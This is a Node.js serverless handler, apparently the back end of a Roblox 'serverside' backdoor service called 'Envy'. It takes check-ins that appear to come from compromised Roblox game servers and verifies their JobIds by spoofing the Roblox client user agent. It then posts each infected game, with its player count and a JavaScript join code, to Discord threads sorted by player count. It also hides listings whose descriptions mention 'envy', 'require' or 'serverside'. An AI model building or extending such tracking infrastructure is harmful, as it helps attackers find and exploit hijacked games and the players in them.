const { Redis } = require('ioredis');
const ip = require('ip');
const crypto = require('crypto');

// --- Initialization ---
const redis = new Redis(process.env.AIVEN_VALKEY_URL);
redis.on('error', (err) => console.error('[ioredis] client error:', err));

// ---- CONFIGURATION ----
const MAX_DESCRIPTION_LENGTH        = parseInt(process.env.MAX_DESCRIPTION_LENGTH, 10) || 500;
const FALLBACK_ROBLOX_IP_RANGES     = ('128.116.0.0/16').split(',');
const AUTH_CACHE_EXPIRATION_SECONDS = 300;

// --- API Endpoints ---
const ROBLOX_API_ENDPOINT       = 'https://apis.roblox.com';
const ROPROXY_API_ENDPOINT      = 'https://games.roproxy.com';
const THUMBNAILS_API_ENDPOINT   = 'https://thumbnails.roblox.com';
const GAMEJOIN_API_ENDPOINT     = 'https://gamejoin.roblox.com';

// --- User Agents ---
const USER_AGENT_AGENT_E        = 'Agent-E';
const USER_AGENT_ROBLOX_LINUX   = 'Roblox/Linux';
const USER_AGENT_ROBLOX_WININET = 'Roblox/WinInet';

// --- Redis Keys ---
const REDIS_KEY_PREFIX_LOCK_GAME    = 'lock:game:';
const REDIS_KEY_PREFIX_GAME         = 'game:';
const REDIS_KEY_PREFIX_THUMBNAIL    = 'thumbnail:';
const REDIS_KEY_PREFIX_UNIVERSE_ID  = 'universe_id:';
const REDIS_KEY_PREFIX_AUTH         = 'auth:';
const REDIS_KEY_PREFIX_AUTH_ATTEMPT = 'auth_attempt:';
const REDIS_KEY_PREFIX_RATE         = 'rate:';
const REDIS_KEY_ROBLOX_IP_RANGES    = 'roblox_ip_ranges';
const REDIS_KEY_REJECTED_IPS        = 'rejected_ips';


// --- CONSTANTS ---
const FORUM_WEBHOOK_URL     = process.env.FORUM_WEBHOOK_URL;
const SECRET_HEADER_KEY     = process.env.SECRET_HEADER_KEY;
const THREAD_ID_VERY_LOW    = process.env.THREAD_ID_VERY_LOW;
const THREAD_ID_LOW         = process.env.THREAD_ID_LOW;
const THREAD_ID_MEDIUM      = process.env.THREAD_ID_MEDIUM;
const THREAD_ID_HIGH        = process.env.THREAD_ID_HIGH;
const THREAD_ID_ENVIOUS     = process.env.THREAD_ID_ENVIOUS;

const REQUIRED_ENV_VARS = [
'AIVEN_VALKEY_URL',
'FORUM_WEBHOOK_URL',
'SECRET_HEADER_KEY',
'THREAD_ID_VERY_LOW',
'THREAD_ID_LOW',
'THREAD_ID_MEDIUM',
'THREAD_ID_HIGH',
'THREAD_ID_ENVIOUS'
];

for (const envVar of REQUIRED_ENV_VARS) {
if (!process.env[envVar]) {
    throw new Error(`Missing required environment variable: ${envVar}`);
}
}

// --- Functions ---

function getThreadId(playerCount) {
    if (playerCount === 1) return THREAD_ID_VERY_LOW;
    if (playerCount >= 2 && playerCount <= 5) return THREAD_ID_LOW;
    if (playerCount >= 6 && playerCount <= 50) return THREAD_ID_MEDIUM;
    if (playerCount >= 51 && playerCount <= 500) return THREAD_ID_HIGH;
    if (playerCount > 500) return THREAD_ID_ENVIOUS;
    return null; // No thread for other player counts
}
function isIpInRanges(clientIp, ranges) {
    for (const range of ranges) {
        try {
            if (ip.cidrSubnet(range).contains(clientIp)) {
                return true; // Match found!
            }
        } catch (e) {
            // This range was invalid (e.g., not a CIDR). Ignore it and continue.
            continue;
        }
    }
    // If we finished the loop with no match, the IP is not in any range.
    console.log(`IP ${clientIp} was not found in any of the ${ranges.length} ranges.`);
    return false;
}

async function fetchGameInfo(placeId, redis) {
    try {
        // Step 1: Get Universe ID, caching it for 24 hours as it's static.
        const universeIdCacheKey = `${REDIS_KEY_PREFIX_UNIVERSE_ID}${placeId}`;
        let universeId = await redis.get(universeIdCacheKey);
        if (!universeId) {
            const universeResponse = await fetch(`${ROBLOX_API_ENDPOINT}/universes/v1/places/${placeId}/universe`, {
                headers: { 'User-Agent': USER_AGENT_AGENT_E },
            });
            if (!universeResponse.ok) {
                throw new Error(`Failed to fetch universe ID: ${await universeResponse.text()}`);
            }
            const universeData = await universeResponse.json();
            universeId = universeData.universeId;
            await redis.set(universeIdCacheKey, universeId, 'EX', 86400); // 24-hour cache
        }

        // Step 2: Get Thumbnail URL, caching it for 24 hours as it's static.
        const thumbnailCacheKey = `${REDIS_KEY_PREFIX_THUMBNAIL}${universeId}`;
        let thumbnail = await redis.get(thumbnailCacheKey);
        if (!thumbnail) {
            const thumbResponse = await fetch(`${THUMBNAILS_API_ENDPOINT}/v1/games/icons?universeIds=${universeId}&size=512x512&format=Png`, {
                headers: { 'User-Agent': USER_AGENT_AGENT_E },
            });
            if (thumbResponse.ok) {
                const thumbData = await thumbResponse.json();
                if (thumbData.data && thumbData.data.length > 0 && thumbData.data[0].imageUrl) {
                    thumbnail = thumbData.data[0].imageUrl;
                    await redis.set(thumbnailCacheKey, thumbnail, 'EX', 86400); // 24-hour cache
                }
            }
            if (!thumbnail) {
                 console.error("Thumbnail fetch error:", await thumbResponse.text());
                 throw new Error('Failed to fetch thumbnail');
            }
        }

        // Step 3: Always fetch game details for live data (e.g., player count).
        const gameResponse = await fetch(`${ROPROXY_API_ENDPOINT}/v1/games?universeIds=${universeId}`, {
            headers: { 'User-Agent': USER_AGENT_AGENT_E },
        });
        if (!gameResponse.ok) {
            throw new Error(`Game fetch error: ${await gameResponse.text()}`);
        }
        const gameData = await gameResponse.json();
        if (!gameData.data || gameData.data.length === 0) {
            throw new Error('Roblox API returned empty game data');
        }
        const gameInfo = gameData.data[0];

        return { gameInfo, universeId, thumbnail };
    } catch (error) {
        console.error("Error fetching game info:", error.message);
        throw error;
    }
}

function formatNumber(n) {
    n = parseInt(n);
    if (isNaN(n)) return "Unknown";
    return n >= 1e6 ? `${(n / 1e6).toFixed(1)}M`
        : n >= 1e3 ? `${(n / 1e3).toFixed(1)}K`
        : n.toString();
}

function formatDate(dateString) {
    try {
        const date = new Date(dateString);
        const now = new Date();
        const diffMs = now - date;
        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
        const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
        const diffMinutes = Math.floor(diffMs / (1000 * 60));

        // Format absolute date
        const month = String(date.getMonth() + 1).padStart(2, '0');
        const day = String(date.getDate()).padStart(2, '0');
        const year = date.getFullYear();
        const absoluteDate = `${month}/${day}/${year}`;

        // Format relative time
        let relativeTime;
        if (diffMinutes < 60) {
            relativeTime = `${diffMinutes} minute${diffMinutes !== 1 ? 's' : ''} ago`;
        } else if (diffHours < 24) {
            relativeTime = `${diffHours} hour${diffHours !== 1 ? 's' : ''} ago`;
        } else if (diffDays < 30) {
            relativeTime = `${diffDays} day${diffDays !== 1 ? 's' : ''} ago`;
        } else if (diffDays < 365) {
            const months = Math.floor(diffDays / 30);
            relativeTime = `${months} month${months !== 1 ? 's' : ''} ago`;
        } else {
            const years = Math.floor(diffDays / 365);
            relativeTime = `${years} year${years !== 1 ? 's' : ''} ago`;
        }

        return `${relativeTime} (${absoluteDate})`;
    } catch (e) {
        return "Unknown";
    }
}


function createDiscordEmbed(gameInfo, placeId, thumbnail, JobId, isNonHttp = false) {
    let creator = "";
    if (gameInfo.creator.type === "User") {
        creator = `:man_police_officer: **Owner**: [${gameInfo.creator.name}](https://www.roblox.com/users/${gameInfo.creator.id || 0}/profile)\n` +
                  `:identification_card: **ID**: \`${gameInfo.creator.id}\`\n` +
                  `:ballot_box_with_check: **Verified**: \`${gameInfo.creator.hasVerifiedBadge}\``;
    } else {
        creator = `:police_car: **Owner**: [${gameInfo.creator.name}](https://www.roblox.com/communities/${gameInfo.creator.id || 0})`;
    }

    let description = gameInfo.description || "No description";
    if (description.length > MAX_DESCRIPTION_LENGTH) {
        description = description.slice(0, MAX_DESCRIPTION_LENGTH) + '...';
    }

    return {
        content: "",
        username: "Envy Messenger",
        avatar_url: "https://i.ibb.co/TMQbDpH8/image.png",
        embeds: [{
            title: gameInfo.name,
            url: `https://www.roblox.com/games/${placeId}`,
            color: parseInt("0x8200c8", 16),
            author: {
                name: "A new game has been envied!",
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png"
            },
            thumbnail: { url: thumbnail },
            fields: [
                {
                    name: "> **Game Information**",
                    value: `:busts_in_silhouette: **Players**: \`${gameInfo.playing}\`\n` +
                           `:desktop: **Server Size**: \`${gameInfo.maxPlayers || "Unknown"}\`\n` +
                           `:eye_in_speech_bubble: **Visits**: \`${formatNumber(gameInfo.visits)}\`\n` +
                           `:star: **Favorites**: \`${formatNumber(gameInfo.favoritedCount)}\`\n` +
                           `:crossed_swords: **Genre**: \`${gameInfo.genre}\`\n` +
                           `:notepad_spiral: **Description**: \`\`\`${description}\`\`\`\n` +
                           `:date: **Last Game Update**: \`${formatDate(gameInfo.updated)}\`\n` +
                           `:zap: **Javascript Join Code**: \`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "${JobId}")\`\`\`\n`+ (isNonHttp ?  
                           `\n## :warning: WARNING: This game is non-HTTP Enabled and may provide inaccurate data.` : ""),
                    inline: true
                },
                {
                    name: "> **Owner Information**",
                    value: creator,
                    inline: true
                }
            ],
            footer: {
                icon_url: "https://i.ibb.co/TMQbDpH8/image.png",
                text: "Envy Serverside"
            },
            timestamp: new Date().toISOString()
        }]
    };
}

async function isJobIdAuthentic(placeId, targetJobId) {
    const apiUrl = `${GAMEJOIN_API_ENDPOINT}/v1/join-game-instance`;
    try {
        const apiResponse = await fetch(apiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'User-Agent': USER_AGENT_ROBLOX_WININET },
            body: JSON.stringify({ placeId: placeId, gameId: targetJobId })
        });
        return apiResponse.status < 500;
    } catch (error) {
        console.error("Error during JobId authentication:", error);
        return false;
    }
}

module.exports = async (request, response) => {
    // Vercel: Check method
    if (request.method !== 'POST') {
        return response.status(405).send('Method Not Allowed.');
    }

    // Vercel: Get IP from 'x-vercel-forwarded-for' header
    const clientIp = request.headers['x-vercel-forwarded-for'];
    if (!clientIp) {
        return response.status(403).send('Forbidden: Could not determine client IP address.');
    }

    // --- Request Validation ---
    const userSecret = request.headers['x-secret-header'];
    const secret = SECRET_HEADER_KEY || '';
    if (!userSecret || !crypto.timingSafeEqual(Buffer.from(userSecret), Buffer.from(secret))) {
        return response.status(401).send('Unauthorized');
    }
    if (request.headers['user-agent'] !== USER_AGENT_ROBLOX_LINUX) {
        return response.status(400).send('Access Denied.');
    }

    // --- IP Validation ---
    let activeIpRanges = FALLBACK_ROBLOX_IP_RANGES;
    try {
        const dynamicRangesJson = await redis.get(REDIS_KEY_ROBLOX_IP_RANGES);
        if (dynamicRangesJson) activeIpRanges = JSON.parse(dynamicRangesJson);
    } catch (e) {
        console.error("Could not get IP list from Redis.", e);
    }
    const isIpFromRoblox = isIpInRanges(clientIp, activeIpRanges);
    if (!isIpFromRoblox) {
        console.warn(`Rejected request from non-Roblox IP: ${clientIp}`);
        const rejectedIpsCount = await redis.zcard(REDIS_KEY_REJECTED_IPS);
        if (rejectedIpsCount < 10000) {
            await redis.zincrby(REDIS_KEY_REJECTED_IPS, 1, clientIp);
        }
        return response.status(200).json({ success: true, message: 'Success' });
    }

    // --- Data Extraction and Validation ---
    const body = request.body;
    const robloxIdHeader = request.headers['roblox-id'];
    let placeId;

    if (!robloxIdHeader || robloxIdHeader === "0") {
        return response.status(200).send('Success!');
    }
    const placeIdMatch = robloxIdHeader.match(/placeId=(\d+)/);
    if (placeIdMatch) {
        placeId = placeIdMatch[1];
    } else if (/^\d+$/.test(robloxIdHeader)) {
        placeId = robloxIdHeader;
    } else {
        return response.status(400).send('Bad Request: 1337');
    }
    const jobId = body.jobId;
    if (!jobId) {
        return response.status(400).send('Bad Request: 1336');
    }

    let lockKey;
    try {
        // --- Core Logic (JobId Auth, Rate Limiting, Discord Message Handling) ---
        const authAttemptKey = `${REDIS_KEY_PREFIX_AUTH_ATTEMPT}${clientIp}`;
        const attempts = await redis.incr(authAttemptKey);
        if (attempts === 1) {
            await redis.expire(authAttemptKey, 60 * 5); // 5 minutes expiry
        }
        if (attempts > 30) { // Max 30 attempts in 5 minutes
            return response.status(429).send('Too many authentication requests.');
        }

        const authCacheKey = `${REDIS_KEY_PREFIX_AUTH}${jobId}`;
        const isAlreadyAuthenticated = await redis.get(authCacheKey);
        if (!isAlreadyAuthenticated) {
            const isAuthentic = await isJobIdAuthentic(placeId, jobId);
            if (!isAuthentic) {
                console.warn(`Rejected unauthenticated JobId: ${jobId}`);
                return response.status(403).send('Forbidden: JobId authentication failed.');
            }
            await redis.set(authCacheKey, 'true', 'EX', AUTH_CACHE_EXPIRATION_SECONDS);
        }
        const rateLimitKey = `${REDIS_KEY_PREFIX_RATE}${jobId}`;
        const currentRequests = await redis.incr(rateLimitKey);
        if (currentRequests === 1) await redis.expire(rateLimitKey, 60);
        if (currentRequests > 20) return response.status(429).send('Too Many Requests');
        
        const { gameInfo, universeId, thumbnail } = await fetchGameInfo(placeId, redis);
        lockKey = `${REDIS_KEY_PREFIX_LOCK_GAME}${universeId}`;
        const lockAcquired = await redis.set(lockKey, 'locked', 'EX', 10, 'NX');

        if (!lockAcquired) {
            lockKey = null; // Don't release the lock we don't own.
            return response.status(429).send('This game is currently being processed.');
        }

        const gameKey = `${REDIS_KEY_PREFIX_GAME}${universeId}`;
        const rawGameData = await redis.get(gameKey);
        let gameData = null;
        if (rawGameData) {
            try {
                gameData = JSON.parse(rawGameData);
            } catch (e) {
                console.error("Failed to parse game data:", e);
                // Treat as if no game data was found by leaving gameData as null
            }
        }
        let messageId = gameData ? gameData.messageId : null;
        let threadId = gameData ? gameData.threadId : null;
        const currentTime = Math.floor(Date.now() / 1000);
        const newThreadId = getThreadId(gameInfo.playing);

        if (gameInfo.playing === 0 || gameInfo.description?.includes("envy") || gameInfo.description?.includes("require") || gameInfo.description?.includes("serverside") || !newThreadId) {
            if (messageId) {
                const deleteUrl = `${FORUM_WEBHOOK_URL}/messages/${messageId}?thread_id=${threadId}`;
                await fetch(deleteUrl, { method: 'DELETE' })
                    .catch(err => console.error(`Error deleting Discord message ${messageId}:`, err));
                await redis.del(gameKey);
            }
            return response.status(200).json({ success: true, action: 'skipped_or_deleted' });
        }

        const payload = createDiscordEmbed(gameInfo, placeId, thumbnail, jobId, false);
        const headers = { 'Content-Type': 'application/json', 'User-Agent': USER_AGENT_AGENT_E };

        if (messageId && threadId === newThreadId) {
            const editUrl = `${FORUM_WEBHOOK_URL}/messages/${messageId}?thread_id=${threadId}`;
            const editResponse = await fetch(editUrl, { method: 'PATCH', headers, body: JSON.stringify(payload) });
            if (!editResponse.ok && editResponse.status === 404) {
                messageId = null;
            }
        } else {
            if (messageId) {
                const deleteUrl = `${FORUM_WEBHOOK_URL}/messages/${messageId}?thread_id=${threadId}`;
                await fetch(deleteUrl, { method: 'DELETE' }).catch(err => console.error(`Error deleting Discord message ${messageId}:`, err));
            }
            messageId = null;
        }
        
        if (!messageId) {
            const createUrl = `${FORUM_WEBHOOK_URL}?wait=true&thread_id=${newThreadId}`;
            const createResponse = await fetch(createUrl, { method: 'POST', headers, body: JSON.stringify(payload) });
            if (!createResponse.ok) throw new Error(`Discord API Error on POST: ${createResponse.status}`);
            const responseData = await createResponse.json();
            messageId = responseData.id;
            threadId = newThreadId;
        }

        const newGameData = { messageId: messageId, threadId: threadId, timestamp: currentTime, placeId: placeId };
        // Use a pipeline to set the game data and add to the sorted set atomically
        const pipeline = redis.pipeline();
        pipeline.set(gameKey, JSON.stringify(newGameData));
        pipeline.zadd('games_by_timestamp', currentTime, gameKey);
        await pipeline.exec();

        return response.status(200).json({ success: true, messageId: messageId });

    } catch (error) {
        console.error("Main Handler Error:", error);
        return response.status(500).send(`Internal Server Error: ${error.message}`);
    } finally {
        if (lockKey) await redis.del(lockKey);
    }
}
